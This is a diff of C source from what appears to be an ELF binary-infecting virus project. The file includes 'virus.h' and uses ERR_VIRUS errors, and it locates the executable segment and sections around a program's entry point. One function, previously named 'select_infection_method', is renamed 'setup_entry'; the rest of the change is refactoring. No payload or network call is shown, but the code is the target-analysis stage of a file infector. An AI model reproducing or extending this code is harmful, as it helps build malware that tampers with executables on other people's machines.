@@ -1,16 +1,17 @@
 #include "virus.h"
 #include "utils.h"
-#include "errors.h"
 #include "compiler_utils.h"
+#include "errors.h"
 
 #define is_exec_phdr(type, flags) (type == PT_LOAD && flags == (PF_R | PF_X))
+#define is_exec_shdr(type, flags) (sh_type == SHT_PROGBITS && sh_flags == (SHF_ALLOC | SHF_EXECINSTR))
 
 struct data
 {
-	struct elf64_phdr	*safe_entry_phdr;   // entry program header
-	struct elf64_shdr	*safe_entry_shdr;   // entry section header
-	struct elf64_shdr	*safe_low_shdr;     // lowest section header
-	Elf64_Addr		e_entry;            // program entry
+	Elf64_Phdr	*safe_entry_phdr;   // entry program header
+	Elf64_Shdr	*safe_entry_shdr;   // entry section header
+	Elf64_Shdr	*safe_low_shdr;     // lowest section header
+	Elf64_Addr	e_entry;            // program entry
 };
 
 static bool	find_phdr(struct safe_ptr ref, const size_t offset,
@@ -24,13 +25,13 @@ static bool	find_phdr(struct safe_ptr ref, const size_t offset,
 	const uint32_t		p_type  = seg_hdr->p_type;
 	const uint32_t		p_flags = seg_hdr->p_flags;
 	const Elf64_Addr	p_vaddr = seg_hdr->p_vaddr;
-	const Elf64_Xword	p_memsz = seg_hdr->p_memsz;
+	const uint64_t		p_memsz = seg_hdr->p_memsz;
 
 	struct data		*closure = data;
 	const Elf64_Addr	e_entry  = closure->e_entry;
 
 	if (is_exec_phdr(p_type, p_flags)
-		&& p_vaddr <= e_entry && e_entry < p_vaddr + p_memsz)
+	&& p_vaddr <= e_entry && e_entry < p_vaddr + p_memsz)
 	{
 		closure->safe_entry_phdr = seg_hdr;
 	}
@@ -50,8 +51,8 @@ static bool	find_shdr(struct safe_ptr ref, const size_t offset,
 	if (!closure->safe_entry_phdr)
 		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
 
-	size_t	stored_sh_addr = closure->safe_low_shdr ?
-			closure->safe_low_shdr->sh_addr : ~0ull;
+	const Elf64_Addr	stored_sh_addr = closure->safe_low_shdr ?
+					closure->safe_low_shdr->sh_addr : ~0ull;
 
 	const Elf64_Addr	e_entry  = closure->e_entry;
 	const Elf64_Off		p_vaddr  = closure->safe_entry_phdr->p_vaddr;
@@ -66,23 +67,22 @@ static bool	find_shdr(struct safe_ptr ref, const size_t offset,
 	{
 		closure->safe_entry_shdr = sect_hdr;
 	}
-	if (p_vaddr <= sh_addr && sh_addr < p_vaddr + p_filesz
-	&& (sh_addr < stored_sh_addr)
-	&& (sh_type == SHT_PROGBITS)
-	&& (sh_flags == (SHF_ALLOC | SHF_EXECINSTR)))
+	if (is_exec_shdr(sh_type, sh_flags)
+	&& p_vaddr <= sh_addr && sh_addr < p_vaddr + p_filesz
+	&& sh_addr < stored_sh_addr)
 	{
 		closure->safe_low_shdr = sect_hdr;
 	}
 	return true;
 }
 
-static bool	select_infection_method(struct entry *entry,
+static bool	setup_entry(struct entry *entry,
 			struct data *closure)
 {
-	struct elf64_phdr	*safe_entry_phdr = closure->safe_entry_phdr;
-	struct elf64_shdr	*safe_entry_shdr = closure->safe_entry_shdr;
-	struct elf64_shdr	*safe_low_shdr   = closure->safe_low_shdr;
-	Elf64_Addr		e_entry          = closure->e_entry;
+	Elf64_Phdr	*safe_entry_phdr = closure->safe_entry_phdr;
+	Elf64_Shdr	*safe_entry_shdr = closure->safe_entry_shdr;
+	Elf64_Shdr	*safe_low_shdr   = closure->safe_low_shdr;
+	Elf64_Addr	e_entry          = closure->e_entry;
 
 	if (!safe_entry_phdr || !safe_entry_shdr || !safe_low_shdr)
 		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
@@ -111,8 +111,8 @@ static bool	select_infection_method(struct entry *entry,
 
 bool		find_entry(struct entry *entry, struct safe_ptr ref)
 {
-	struct data		closure;
-	const Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
+	struct data	closure;
+	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
 
 	if (elf_hdr == NULL)
 		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
@@ -123,7 +123,7 @@ bool		find_entry(struct entry *entry, struct safe_ptr ref)
 
 	if (!foreach_phdr(ref, find_phdr, &closure)
 	|| !foreach_shdr(ref, find_shdr, &closure)
-	|| !select_infection_method(entry, &closure))
+	|| !setup_entry(entry, &closure))
 		return errors(ERR_THROW, _ERR_T_FIND_ENTRY);
 
 	return true;
